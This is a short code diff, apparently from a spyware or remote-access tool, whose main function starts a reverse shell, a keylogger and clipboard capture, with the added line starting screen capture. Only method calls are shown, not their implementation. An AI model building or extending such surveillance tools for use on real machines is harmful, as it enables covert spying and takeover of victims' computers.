@@ -7,5 +7,6 @@ int		main(void)
 	_winkeyProcess.startReverseShell();
 	_winkeyProcess.startKeylogger();
 	_winkeyProcess.startclipBoard();
+	_winkeyProcess.startCaptureScreen();
 	while (1);
 }
